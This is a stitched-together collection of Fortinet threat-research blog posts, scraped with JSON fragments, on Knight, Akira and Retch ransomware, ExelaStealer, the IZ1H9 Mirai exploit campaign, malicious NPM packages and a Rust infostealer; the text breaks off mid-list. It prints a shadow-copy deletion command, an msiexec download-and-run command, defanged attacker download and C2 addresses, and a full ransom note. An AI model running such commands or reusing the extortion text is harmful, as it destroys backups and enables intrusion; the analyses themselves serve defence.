Fortinet'sFortiRecon service, the Knight ransomware group has targeted multiple industry verticals. While Retail was most affected by the Knight ransomware, the group also victimized organizations in healthcare, including hospitals, physicians’ clinics, and dental offices, indicating that the threat actor has no reservations about impacting people who need medical care. When classifying victim organizations by country, the United States is in first place by a significant margin. As of October 20, 2023, the Knight ransomware group had last posted new victims on October 18th. Once a network has been compromised and data has been exfiltrated, files encrypted by the Knight ransomware are appended with a “.knight_l” file extension. It then drops a ransom note labeled, “How To Restore Your Files.txt.” Because the Knight ransomware targets enterprises, the ransom fee is set at a relatively high price. However, the Bitcoin wallet in this ransom note had no recorded transactions at the time of our investigation. The Knight ransomware group owns a TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there. The group also uses another TOR site for disclosing stolen data and has abused several publicly available file-sharing services, such as Mega, Gofile, and UploadNow. Fortinet customers are already protected from these malware variants through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Knight ransomware samples with the following AV signature: FortiGuard Labs detects the known Knight ransomware droppers with the following AV signature: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. Known hosting sites of the Knight ransomware droppers are blocked by the Web filtering client.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP), is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning, to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation.

    "content": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:The information collected can be used for future attacksSeverity Level:Medium In 2023, the InfoStealer market is a reasonably crowded affair. The likes of RedLine, Raccoon, and Vidar own a significant market share, with new entrants such as SaphireStealer appearing frequently. The latest entry, ExelaStealer has now taken the field. Very little backstory is available on ExelaStealer, with the earliest public mentions FortiGuard Labs could locate occurring in August 2023. FortiGuard Labs research reveals that ExelaStealer is a largely open-source InfoStealer with paid customizations available from the threat actor. It is written in Python, although it pulls resources from other languages (e.g., JavaScript) where needed. It can steal sensitive information from a Windows-based host (e.g., passwords, credit cards, cookies and session data, and general keylogging). FortiGuard Labs was able to obtain a sample. This blog will analyze its inner workings. Advertising on the Dark Web for ExelaStealer offers both an open-source and paid-for version. These advertisements also provide good insight into its capabilities. Some ads appear to have been posted by the prime contact for ExelaStealer, an individual or group using the handle “quicaxd.” As shown in Figure 2, the cost for a month of use is $20, while three months is $45. A lifetime subscription is $120. Additionally, its Telegram channel is shown, which was active at the time of writing. Its Telegram home allows individuals to purchase a copy of the paid-for version and the GitHub repo for the open-source version. Anyone with the necessary skills could create an ExelaStealer binary using the freely available source code. The malware can currently only be compiled and packaged on a Windows-based host. The primary code for the malware is contained in a file named “Exela.py.” The build process is initiated using a batch file that then calls Python and the “builder.py” file. The builder uses a file named “obf.py” to make the calls necessary to obfuscate ExelaStealer’s code, making it harder to analyze. The non-library and now obfuscated code is distilled into a file named “Obfuscated.py,” which is ready for use. The binaries analyzed by FortiGuard Labs appeared to have been released as part of a specific campaign. The use of a decoy document supports this. Unfortunately, the initial infection vector was not available to us. However, initial infection could be achieved in any number of ways (e.g., phishing, watering holes, other malware, etc.). This binary acts as a container and first stage for the deployment. Its job is the spawning of the “sirket-ruhsat-pdf.exe”  (95d860570b2777d7af213f9b48747d528251facada54842d7a07a5798fcbfe51) executable and launching a PDF viewer to display a decoy document (BNG 824 ruhsat.pdf) to the user. It will deposit both files into the root of the C: Drive. “sirket-ruhsat-pdf.exe” automatically attempts to find a compatible viewer and launch “BNG 824 ruhsat.pdf”. The PDF is a copy of a Turkish vehicle registration certificate for a Dacia Duster. The document is entirely benign and simply a visual decoy to the user. “sirket-ruhsat-pdf.exe” is a PyInstaller executable. As such, a tool such as “pyinstxtractor” (https://github.com/extremecoders-re/pyinstxtractor) can extract the archive's contents for inspection. The executable is most likely signed with a fraudulent or invalid certificate and uses the name “Runtime Broker,” a legitimate Microsoft process. Figure 10 shows the compiled version of the “Obfuscated.py” file. Using another tool, such as “pycdc” (Python Byte-code Disassembler/Decompiler - https://github.com/zrax/pycdc), the code in “Obfuscated.pyc” can be decompiled. Unfortunately, as good as its word, function names and variable values in the file are heavily obfuscated, increasing the time required to analyze it statically. That does not make it impossible, however. A large blob of data in the code looks out of place compared to the rest of the instructions. Functions at the end of the file allow for its decoding and execution. By taking those functions and depositing them with the blob into a test script, we can obtain the full decoded contents for review. Figure 14 shows the final output, which you’ll note is the code for “Exela.py.” except in this case, it is being used in the wild. Turning our attention to dynamic analysis, the first activity that “sirket-ruhsat-pdf.exe” will complete is spawning itself in a new process. ExelaStealer then runs the following two commands: These collect the version of Windows and the host’s UUID (Universally Unique Identifier). What follows next is a base-64 encoded PowerShell command. Decoded, this command attempts to grab a screenshot of whatever is currently displayed on the screen. A flurry of both PowerShell and command-line items then follows: These commands copy images from the Clipboard and gather basic system information, basic physical disk information, user information, firewall status, and, interestingly, WLAN status and profile. To store this information locally before sending it back to the TA, a folder is created in “C:\\Users\\<user>\\AppData\\Local\\Temp\\” and named using the UUID of the host. Each text file contains a URL back to the Telegram channel of the TA. The files are packaged into a Zip archive using the same name as the folder (the UUID). This is then sent using a Discord webhook (https://discord.com/developers/docs/resources/webhook) to post to a TA-controlled Discord channel. Data has become a valuable currency, and because of this, attempts to gather it will likely never cease. InfoStealer malware exfiltrates data belonging to corporations and individuals that can be used for blackmail, espionage, or ransom. Despite the number of infostealers in the wild, ExelaStealer shows there is still room for new players to emerge and gain traction. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog The WebFiltering client blocks all network-based URIs.

    "content": "FortiGuard Labs Threat Research Update 4/24/24 – The latest CISA Advisory#StopRansomware: Akira Ransomware | CISAcontains contributions from Fortinet and other industry partners. On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Akira ransomware. Affected platforms:Microsoft Windows, LinuxImpacted parties:Microsoft Windows and Linux UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Akira is a relatively new ransomware variant with Windows and Linux versions that came out in April 2023. Like many attackers, the gang behind this variant only uses the ransomware to encrypt files after first breaking into a network and stealing data. This group also employs a double extortion tactic, demanding a ransom from victims in exchange for file decryption and not leaking stolen information to the public. According to anadvisoryissued by CERT India, Akira typically targets organizations running a VPN (virtual private network) service without multi-factor authentication configured. Purchasing network access from the initial access brokers is another possibility. According to data collected through Fortinet'sFortiRecon service, the Akira ransomware group has targeted various industry sectors. While Manufacturing is its most targeted sector, it only leads the second-ranked sector, Business Services, by 2%. Other industry sectors are mostly evenly targeted, which indicates that the Akira ransomware group victimized any organizations they found vulnerable. When victim organizations are classified by country, the United States is in first place by a significant margin. As of September 22, 2023, the Akira ransomware group had last posted new victims on September 18th. Once a network has been compromised and data has been exfiltrated, the ransomware group will deploy the Windows version of the Akira ransomware to machines running the Windows operating system. The ransomware looks for and encrypts files on those machines. However, it skips the following file extensions for file encryption: The following directories are also excluded from file encryption: The Akira ransomware offers a few command-line options for attackers when executing: The ransomware adds a “.akira” extension to encrypted files. It then drops the following ransom note, labeled \" akira_readme.txt,\" in every folder where files are encrypted. It also runs the following PowerShell command to delete Shadow Copies, which makes file recovery difficult. powershell.exe -Command \"Get-WmiObject Win32_Shadowcopy | Remove-WmiObject\" The Linux version of the Akira ransomware targets files with the following extensions for encryption: \".4dd\", \".4d\", \".accdb\", \".accdc\", \".accde\", \".accdr\", \".accdt\", \".accft\", \".adb\", \".ade\", \".adf\", \".adp\", \".arc\", \".ora\", \".alf\", \".ask\", \".btr\", \".bdf\", \".cat\", \".cdb\", \".ckp\", \".cma\", \".cpd\", \".dacpac\", \".dad\", \".dadiagrams\", \".daschema\", \".db\", \".db-shm\", \".db-wa\", \".db3\", \".dbc\", \".dbf\", \".dbs\", \".dbt\", \".dbv\", \".dbx\", \".dcb\", \".dct\", \".dcx\", \".dd\", \".dlis\", \".dp1\", \".dqy\", \".dsk\", \".dsn\", \".dtsx\", \".dx\", \".eco\", \".ecx\", \".edb\", \".epim\", \".exb\", \".fcd\", \".fdb\", \".fic\", \".fmp\", \".fmp12\", \".fmps\", \".fo\", \".fp3\", \".fp4\", \".fp5\", \".fp7\", \".fpt\", \".frm\", \".gdb\", \".grdb\", \".gwi\", \".hdb\", \".his\", \".ib\", \".idb\", \".ihx\", \".itdb\", \".itw\", \".jet\", \".jtx\", \".kdb\", \".kexi\", \".kexic\", \".kexis\", \".lgc\", \".lwx\", \".maf\", \".maq\", \".mar\", \".mas\", \".mav\", \".mdb\", \".mdf\", \".mpd\", \".mrg\", \".mud\", \".mwb\", \".myd\", \".ndf\", \".nnt\", \".nrmlib\", \".ns2\", \".ns3\", \".ns4\", \".nsf\", \".nv\", \".nv2\", \".nwdb\", \".nyf\", \".odb\", \".oqy\", \".orx\", \".owc\", \".p96\", \".p97\", \".pan\", \".pdb\", \".pdm\", \".pnz\", \".qry\", \".qvd\", \".rbf\", \".rctd\", \".rod\", \".rodx\", \".rpd\", \".rsd\", \".sas7bdat\", \".sbf\", \".scx\", \".sdb\", \".sdc\", \".sdf\", \".sis\", \".spq\", \".sq\", \".sqlite\", \".sqlite3\", \".sqlitedb\", \".te\", \".temx\", \".tmd\", \".tps\", \".trc\", \".trm\", \".udb\", \".ud\", \".usr\", \".v12\", \".vis\", \".vpd\", \".vvv\", \".wdb\", \".wmdb\", \".wrk\", \".xdb\", \".xld\", \".xmlff\", \".abcddb\", \".abs\", \".abx\", \".accdw\", \".adn\", \".db2\", \".fm5\", \".hjt\", \".icg\", \".icr\", \".lut\", \".maw\", \".mdn\", \".mdt\", \".vdi\", \".vhd\", \".vmdk\", \".pvm\", \".vmem\", \".vmsn\", \".vmsd\", \".nvram\", \".vmx\", \".raw\", \".qcow2\", \".subvo\", \".bin\", \".vsv\", \".avhd\", \".vmrs\", \".vhdx\", \".avdx\", \".vmcx\", \".iso\" The Linux variant of Akira also uses various symmetric key algorithms for file encryption, including AES, CAMELLIA, DES, and IDEA. One notable thing about the Linux version is that it excludes the same file extensions and directories from file encryption as the Windows version. This indicates that the attacker has ported the Windows version to Linux. It also drops the same ransom note as the Windows version: The Akira ransomware group owns its own TOR site where victims can contact the threat actor. Stolen information and a list of victims are also posted there. Unlike the TOR sites used by other ransomware groups, Akira’s TOR site accepts commands and displays results. For example, executing the “leaks” command will bring up links to the stolen data and the information on victim organizations. The Akira attacker has also made that data available on Torrent. Another command, “news,” brings up a list of victim organizations and their information. As of September 22, 2023, the latest victims had been posted on September 18. The Akira ransomware has claimed six victims so far in September 2023. The group went hot in August, victimizing more than 20 organizations. We have also observed at least a few minor variants of Akira ransomware. The latest minor variant is Megazord, which came out in late August 2023. “Megazord” evokes the giant robot from the Japanese superhero drama series Power Rangers. The attacker’s pick of “Megazord” is fitting for an Akira variant as the name “Akira” was most likely taken from a popular Japanese cyberpunk comic and movie with the same name. The variant drops a ransom note labeled “powerranges.txt”. The content of “powerranges.txt” is below: Hi friends, Whatever who you are and what your title is if you're reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption. Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment, you have to know: 1. Dealing with us you will save A LOT dueto we are not interested in ruining your financially. We will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. If you have an active cyber insurance, let us know and we will guide you how to properly use it. Also, dragging out the negotiation process will lead to failing of a deal. 2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. If you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them - in this case we won't be able to help. 3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we've managed to detect and used in order to get into, identify backup solutions and upload your data. 4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes - generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones. Then all of this will be published in our blog - https://akira[removed].onion. 5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us. If you're indeed interested in our assistance and the services we provide you can reach out to us following simple instructions: 1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/. 2. Paste this link - https://akira[removed].onion. 3. Use this code – [removed] - to log into our chat. Keep in mind that the faster you will get in touch, the less damage we cause. As shown, Megazord’s ransom note asks victims to visit the Akira ransomware’s TOR site. There is one other Megazord ransomware variant. However, that variant only has the attacker’s Telegram channel and Tox ID for contact methods. Interestingly, Megazord is written in Rust, whereas a typical Akira build is in C++. This may indicate that future Akira variants will be written in Rust or that it is going through a rebranding. Only time will tell. Older minor variants came out in May and June of 2023. One minor variant from May adds a “.iqoj” extension to the encrypted files and leaves a ransom note labeled “readme-asldkas.txt.” Another minor variant from June appends a “.zhq” extension to encrypted files and drops “help-you.txt” as a ransom note. Although the file extensions and ransom note names do not have any “Akira” in them, they still lead victims to Akira’s TOR site.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP), is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning, to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation.

    "link": "https://www.fortinet.com/blog/threat-research/Iz1h9-campaign-enhances-arsenal-with-scores-of-exploits",
    "content": "FortiGuard Labs Threat Research Affected Platforms:LinuxImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical In September 2023, our FortiGuard Labs team observed that the IZ1H9 Mirai-based DDoS campaign has aggressively updated its arsenal of exploits. Thirteen payloads were included in this variant, including D-Link devices, Netis wireless router, Sunhillo SureLine, Geutebruck IP camera, Yealink Device Management, Zyxel devices, TP-Link Archer, Korenix Jetwave, and TOTOLINK routers. Based on the trigger counts recorded by our IPS signatures, it is evident that peak exploitation occurred on September 6, with trigger counts ranging from the thousands to even tens of thousands. This highlights the campaign's capacity to infect vulnerable devices and dramatically expand its botnet through the swift utilization of recently released exploit code, which encompasses numerous CVEs. In this article, we will elaborate on how this threat leverages new vulnerabilities to control affected devices, along with the details of IZ1H9. Four payloads,CVE-2015-1187,CVE-2016-20017,CVE-2020-25506, andCVE-2021-45382, target D-Link vulnerabilities. These critical-severity vulnerabilities can allow remote attackers to deliver command injection via a crafted request. Another exploit,CVE-2019-19356, targets Netis WF2419. It focuses on exploiting a Remote Code Execution (RCE) vulnerability through the tracert diagnostic tool because of a lack of user input sanitizing. The payload injects in parameter “tools_ip_url” and contains the “User-Agent: Dark” header used in the Dark.IoT Botnet. The campaign also seeks to exploit vulnerabilities discovered in 2021, includingCVE-2021-36380, which affect Sunhillo SureLine versions before 8.7.0.1.1,CVE-2021-33544/33548/33549/33550/33551/33552/33553/33554, which allow arbitrary command execution within the parameters of various pages on Geutebruck products, andCVE-2021-27561/27562, which affect Yealink Device Management (DM) 3.6.0.20. The next exploit targets the Zyxel device’s/bin/zhttpd/ componentvulnerability. If insufficient input validation is found, the attacker can exploit the vulnerability to launch a remote code execution attack on Zyxel EMG3525/VMG1312 before V5.50. The threat actor has also incorporated vulnerabilities discovered in 2023 into their exploit payload list.CVE-2023-1389specifically targets TP-Link Archer AX21 (AX1800), whileCVE-2023-23295impacts Korenix JetWave wireless AP. CVE-2022-40475/25080/25079/25081/25082/25078/25084/25077/25076/38511/25075/25083collectively represent a set of related vulnerabilities that focus on TOTOLINK routers. The last one is an unclear exploit payload. It targets “/cgi-bin/login.cgi” and injects a payload in the “key” parameter. A similar vulnerability affects theProlink PRC2402M router, but it is missing a few parameters to achieve remote code execution. It is unclear if the IZ1H9 campaign misused this payload or if they intended to target other devices. The injected payload in the above vulnerabilities intends to get a shell script downloader “l.sh” from hxxp://194[.]180[.]48[.]100. When the script is executed, it begins by deleting logs to conceal its actions. It then downloads and executes various bot clients to cater to diverse Linux architectures. In the final step, the shell script downloader obstructs network connections on multiple ports. This is achieved by altering the device's iptables rules, as illustrated in Figure 9. IZ1H9, a Mirai variant, infects Linux-based networked devices, especially IoT devices, turning them into remote-controlled bots for large-scale network attacks. The XOR key to decode configuration is 0xBAADF00D, shown in Figure 10. The additional payload downloader URLs can be extracted from the decoded configuration in Figure 11, namely hxxp://2[.]56[.]59[.]215/i.sh and hxxp://212[.]192[.]241[.]72/lolol.sh. Both were employed in May 2023. IZ1H9 also includes a data section with pre-set login credentials for brute-force attacks. The XOR decoding key is 0x54, shown in Figure 12, and the decoded data is in Figure 13. As for the C2 communication, victims first send a check-in message with the parameter “l.expl” to the C2 server “194[.]180[.]48[.]101:5034,” and it responds with a keep-alive message “\\x00\\x00.” Once the compromised devices receive a command from the C2 server, shown in Figure 14, they parse the packet to determine the DDoS attack method, target host, and packet count, if specified, before launching the attack. The message structure is as follows: IoT devices have long been an attractive target for threat actors, with remote code execution attacks posing the most common and concerning threats to both IoT devices and Linux servers. The exposure of vulnerable devices can result in severe security risks. Despite the availability of patches for these vulnerabilities, the number of exploit triggers remains alarmingly high, often numbering in the thousands. What amplifies the impact of the IZ1H9 Campaign are the rapid updates to the vulnerabilities it exploits. Once an attacker gains control of a vulnerable device, they can incorporate these newly compromised devices into their botnet, enabling them to launch further attacks like DDoS attacks and brute-force. To counter this threat, it is strongly recommended that organizations promptly apply patches when available and always change default login credentials for devices.

    "title": "Malicious Packages Hidden in NPM",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-packages-hiddin-in-npm",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where NPM packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, source code, etc.Severity level:High Over the past few months, the FortiGuard Labs team has discovered several malicious packages hidden in NPM (Node Package Manager), the largest software registry for the JavaScript programming language. These packages were found through a system dedicated to discover malicious open-source packages from various ecosystems e.g. PyPI, NPM. In this blog, we will look at some of these packages, grouping them based on similar styles of code or functions. In general, most of these malicious packages use install scripts that run pre or post-install. Whenever an NPM package is installed, those scripts are run as well. An example of this is shown below. Every package we found aims to steal sensitive data, such as system or user information, via a webhook or file-sharing link. Let’s explore the sets of packages below. This first set shows an obfuscated index.js script. However, we can identify some clues in the strings that may raise suspicions. Let’s try to simplify this code. After cleaning up the script, we can see it exfiltrates sensitive data, including Kubernetes configurations, SSH keys, and other critical information. It also gathers basic system fingerprinting details, like username, IP address, and hostname, without any prior warning. The index.js in this second set of packages sends an HTTP GET request to a specific URL, including query parameters. It scans for particular files and directories that may contain sensitive information. This script also enables the unauthorized extraction of critical developer data, including source code and configuration files. The targeted files and directories may contain highly valuable intellectual property and sensitive information, such as various application and service credentials. It then archives these files and directories and uploads the resulting archives to an FTP server. In this set, the index.mjs install script uses a Discord webhook to exfiltrate sensitive data, such as system information, username, and folder contents. As with the third set, this fourth set also uses an index.mjs install script and a Discord webhook to exfiltrate sensitive data. But this time, they use an alternate style of coding. This fifth set uses an index.js install script to exfiltrate host and username info and home users’ home directory contents via a webhook. This set—the most commonly found style—uses yet another index.js install script to exfiltrate information. In this set, the packages use an installer.js install script to carry out the attack, similar to the previous two, but we can see that the environment variable ‘NODE_TLS_REJECT_UNAUTHORIZED’ is set to ‘0’. This disables TLS certificate validation, which may make the connection insecure and vulnerable to man-in-the-middle attacks. This package automatically downloads and executes a potentially malicious executable file from a URL to a C:/ directory. This package uses another script style to gather system information, including the victim’s public IP address and then exfiltrates this information to a discord webhook. This blog groups together a collection of malicious NPM packages that use install scripts to steal users’ sensitive info based on styles of code or functions. End users should watch for packages that employ suspicious install scripts and exercise caution. We will continue hunting for and reporting malicious packages to help users avoid becoming victims.

    "link": "https://www.fortinet.com/blog/threat-research/threat-Actors-exploit-the-tensions-between-azerbaijan-and-armenia",
    "content": "FortiGuard Labs Threat Research In 1923, the Soviet Union created the Nagorno-Karabakh Autonomous Oblast (an oblast is an administrative region or province) within the Azerbaijan Soviet Socialist Republic. This oblast has a 95% ethnically Armenian population. In 1988, Nagorno-Karabakh declared its intention to leave Azerbaijan and join the neighboring Republic of Armenia. While the Soviet Union was able to keep the resulting tension under control, once the USSR began to collapse, armed conflict between Azerbaijan and Armenia began for control of the Nagorno-Karabakh region. While a ceasefire was tentatively reached in 1994 and again in 2020,tensions remain highbetween the two countries. Affected platforms:Microsoft WindowsImpacted parties:Targeted management associated with an Azerbaijanian companyImpact:Reconnaissance of basic computer info of targeted usersSeverity level:Low In August 2023, FortiGuard Labs discovered an infected memo pretending to come from the current president of a company in Azerbaijan and aimed at the management teams of associated businesses. Opening this memo downloads malware designed to gather basic information from its targets. This blog analyzes the attack chain, reviews the malware’s capabilities, and reveals the possible location of the threat actor behind it. FortiGuard Labs spotted this attack by finding the memo in Figure 2. The memo claims to have information about a border clash between soldiers from Azerbaijan and Armenia. The memo is in HTML format and usesHTML smugglingto automatically deliver a password-protected archive. This archive, as the memo suggests, contains several images. As shown in the attack diagram in Figure 3, the archive contains three clean images and one phony image. The actual contents are illustrated below. An astute observer may notice that the first \"image\" is not an image file. In reality, it is a .LNK shortcut that executes the following command: ..\\..\\Windows\\System32\\msiexec.exe /i \"https://dl[.]dropboxusercontent[.]com/scl/fi/zjxgh8ofdmfca8bpfntw9/karabakh.jpg.msi? rlkey=nidpjpx3ioigoq6qonibztwg4&dl=0\" This command downloads an .MSI (Microsoft Installer) file. Figure 3 shows this MS installer file performing two actions when clicked. The first action is to display an image with the same filename as the phony image shortcut (shown in the zip archive in Figure 4): This technique may fool some users into thinking the shortcut was simply an image file. But this is misdirection. Instead, the installer simultaneously loads hidden malware into the targeted computer. The malicious installer creates a new folder in the user’s %APPDATA% folder called “Windows Defender Health Check.” It also installs malware with the same name: C:\\Users\\[username]\\AppData\\Roaming\\Windows Defender Health Check\\WindowsDefenderHealthcheck.exe This malware is programmed in RUST, which is not the programming language of choice for most malware authors. This makes using standard analysis tools and methods somewhat less useful. The fact that RUST is used already makes this threat actor different. However, this is not the only trait that makes this malware distinct. For persistence, a temporary file is created called “24rp.xml.” This file is used to create a scheduled task. Once the scheduled task is created, the .XML file is deleted. This technique assumes that the intended targets leave their computers on overnight so the malware can execute outside regular office hours when it is less likely to be noticed. Moreover, for even greater stealth, the malware can sleep for random amounts of time when performing its tasks. Next, we will refer back to Figure 2 for another indication of how this malware attempts to stay hidden. Notice the memo is dated August 8th. By examining its compile timestamp, we found that this malware was created the previous day. This short timeframe makes it virtually impossible to accidentally release the malware before the attack starts. Ultimately, the malware acts like an infostealer, gathering basic computer information and sending it to a C2 server. The following commands are executed: These commands suggest that the threat actor is still in the early stages of attempting to fully compromise its targets. The information being gathered from these commands could be used to tailor specific attacks for each infected target. This infostealer is unique because it also collects a list of environment variables and takes an extra step to check for any proxy servers in use. Figure 10. Checking for proxy If a proxy server is set, the malware understands how to route its traffic. The malware issues a POST request to send the encrypted information it stole to a C2 server owned by the threat actor, 78[.]135.73.140, through port 35667. Our telemetry found nothing too interesting with the C2 server itself. However, digging into the server uncovered additional information. Using data from PDNS and other records, the C2 server 78[.]135.73.140 does not seem to be a shared server. This suggests the threat actor has total control and setup of the server. With this assumption, we searched to discover more of the threat actor’s network infrastructure. Inside the /24 subnet alone, four additional servers were revealed: Using the August 8thdate on the memo as a starting point, we searched traffic going to these servers in the month prior. While we did not find significant amounts of traffic, we identified one IP address in Colombia that connected to the server 78[.]135.73.188 in July on a port commonly used for VPN for a substantial amount of time. If the threat actor wanted to hide their activity, using a VPN server under their control would accomplish the job. The Colombia IP address belongs to a cellular company, which suggests the user may have been using a mobile hotspot. If so, this may be the location of the attacker. The threat actor in this campaign uses a few advanced techniques, including RUST and after-hours execution, to help it stay under the radar and make analysis more difficult. The size of the network infrastructure also suggests this threat actor is not a run-of-the-mill malware developer but someone with access to resources. And the use of a geopolitical rule indicates that this threat actor is plugged in and knows how to target specific users.

    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Retch and S.H.O ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Retch is a new ransomware variant first discovered in mid-August 2023. It encrypts files on compromised machines and leaves two ransom notes asking victims to pay a ransom for file decryption. Information about the infection vector used by the Retch ransomware threat actor is not currently available. However, it is unlikely to be significantly different from other ransomware groups. Retch ransomware samples have been submitted to a public file scanning service from the following countries: Once the ransomware runs, it looks for and encrypts files with the following file extensions: .txt, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .jpeg, .png, .csv, .sql, .mdb, .sln, .php, .asp, .aspx, .html, .xml, .psd, .mp4, .7z, .rar, .m4a, .wma, .avi, .wmv, .d3dbsp, .zip, .sie, .sum, .ibank, .t13, .t12, .qdf, .gdb, .tax, .pkpass, .bc6, .bc7, .bkp .qic, .bkf, .sidn, .sidd, .mddata, .itl, .itdb, .icxs, .hvpl, .hplg, .hkdb,   .mdbackup, .syncdb, .gho, .cas, .svg, .map, .wmo, .itm, .sb, .fos .mov, .vdf, .ztmp .sis, .sid, .ncf,           .menu, .layout, .dmp, .blob, .esm, .vcf, .vtf, .dazip, .fpk, .mlx, .kf, .iwd, .vpk, .tor, .psk, .rim, .w3x,        .fsh, .ntl, .arch00, .lvl, .snx, .cfr, .ff, .vpp_pc, .lrf, .m2, .mcmeta, .vfs0, .mpqge, .kdb, .db0, .dba, .rofl,  .hkx, .bar, .upk, .das, .iwi, .litemod, .asset, .forge, .ltx, .bsa, .apk, .re4, .sav, .lbf, .slm, .bik, .epk,           .rgss3a, .pak, .big, .wallet, .wotreplay, .xxx, .desc, .py, .m3u, .flv, .js, .css, .rb, .p7c, .pk7, .p7b, .p12, .pfx, .pem, .crt, .cer, .der, .x3f, .srw, .pef, .ptx, .r3d, .rw2, 